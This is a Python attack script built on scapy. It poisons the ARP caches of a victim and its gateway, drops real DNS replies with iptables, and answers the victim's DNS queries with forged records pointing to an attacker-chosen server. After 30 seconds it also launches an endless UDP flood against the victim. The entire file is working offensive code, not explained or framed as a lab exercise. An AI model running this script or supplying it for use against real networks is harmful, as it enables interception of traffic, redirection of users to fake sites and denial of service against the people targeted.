
import socket
import sys
import threading
import fcntl
import time
import nmap
from scapy.all import *
import netifaces as nif
import argparse
import random
try:
    parser = argparse.ArgumentParser(description='ARP Cache Poisoning and DNS Spoofing')
    parser.add_argument('-v', '--victim', dest='victim_ip', help="IP Address of the victim", required=True)
    parser.add_argument('-i', '--ip', dest='local_ip', help="Your (attacker) IP Address", required=True)
    parser.add_argument('-r', '--router', dest='router_ip', help="IP Address of the Router", required=True)
    parser.add_argument('-t', '--target', dest='target_ip', help="IP Address of our fake server/site", required=True)
    args = parser.parse_args()
    victim_ip = args.victim_ip
    local_ip = args.local_ip
    router_ip = args.router_ip
    target_ip = args.target_ip
    port = 8080
except KeyboardInterrupt:
    sys.exit(1)


os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("Open Wireshark to view the traffic...")
print("Enabled packet forwarding for attacker....")
os.system("iptables -D FORWARD -d " + victim_ip + " -p UDP --sport 53 -j DROP")
os.system("iptables -A FORWARD -d " + victim_ip + " -p UDP --sport 53 -j DROP")
print("Altered iptables to forward all DNS queries to attacker...")

#Get the interface of the victim machine/gateway for finding the MAC address of them
def iface_for_ip(ip):
    for iface in nif.interfaces():
        addrs = nif.ifaddresses(iface)
        try:
            iface_mac = str(addrs[nif.AF_LINK][0]['addr'])
            iface_ip = str(addrs[nif.AF_INET][0]['addr'])
        except KeyError:
            iface_mac = iface_ip = None

        if iface_ip == ip:
            return iface
    return None
#Function to obtain the MAC address of a given ip
def mac_for_ip(ip):
    interface = iface_for_ip(ip)
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return str(rcv.sprintf(r"%Ether.src%"))

my_mac = mac_for_ip(local_ip)
victim_mac = mac_for_ip(victim_ip)
router_mac = mac_for_ip(router_ip)

#The attack

def initialize():

    victim_packet = Ether(
        src=my_mac,        #sender's mac address
        dst=victim_mac     #victim's mac address
    )/ARP(
        hwsrc=my_mac,      #sender's mac address
        hwdst=victim_mac,  #victim's mac address
        psrc=router_ip,    #router's ip
        pdst=victim_ip,    #victim's ip
        op=2               #arp code 2 = reply
    )
    victim_packet.show()

    router_packet = Ether(
        src=my_mac,        #sender's mac address
        dst=router_mac     #router's mac address
    )/ARP(
        hwsrc=my_mac,      #sender's mac address
        hwdst=router_mac,  #router's mac address
        psrc=victim_ip,    #victim's ip
        pdst=router_ip,    #router's ip
        op=2               #arp code 2 = reply
    )
    router_packet.show()
#Sniff for any DNS queries from victim/gateway
    print("Sniffing for DNS queries...")
    filter_string = 'udp and port 53'
    sniffThrd = threading.Thread(target=sniff_thread, args=(filter_string,))

#Start arp spoof thread
    thrd = threading.Thread(target=arp_thread, args=(victim_packet, router_packet))
    print("ARP Cache has been poisoned at Victim machine: "+victim_ip+" and Gateway: "+router_ip)
    sniffThrd.start()
    thrd.start()
    sniffThrd.join(1)
    thrd.join(1)
    t = threading.Timer(30.0, dosattack, args=(victim_ip, port))
    t.start()
def dosattack(victim_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    sent = 0
    print "Starting DoS attack against "+victim_ip
    while True:
        sock.sendto(bytes, (victim_ip,port))
        sent = sent + 1
        port = port + 1
        if port == 65534:
            port = 1
#ARP Cache Poisoning Attack
def arp_thread(victim_packet, router_packet):
    while 1:
        time.sleep(1.5)
        sendp(victim_packet, verbose=0)
        sendp(router_packet, verbose=0)
#Sniffing function
def sniff_thread(filter_string):
    # Start sniffing for DNS packets
    sniff(prn=process_dns, filter=filter_string, store=0)
#DNS Spoofing -- rdata is set to the fake server/site ip given by the user
def process_dns(pkt):
    #pkt.show()
    if ('DNS' in pkt and pkt['DNS'].opcode == 0L and pkt['DNS'].ancount == 0 and pkt['IP'].src != local_ip):
        pkt.show()
        spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
            / UDP(dport=pkt[UDP].sport, sport=53) \
            / DNS(id=pkt[DNS].id, qr=1, \
                  qd=DNSQR(qname=pkt[DNSQR].qname),\
                  an=DNSRR(rrname=pkt[DNSQR].qname, rdata=target_ip, ttl=3600))

        #spfResp.show()
        send(spfResp, verbose=0)
        return "Spoofed DNS Response Sent..."


if __name__ == "__main__":
    try:
        initialize()
    except KeyboardInterrupt:
        sys.exit(1)
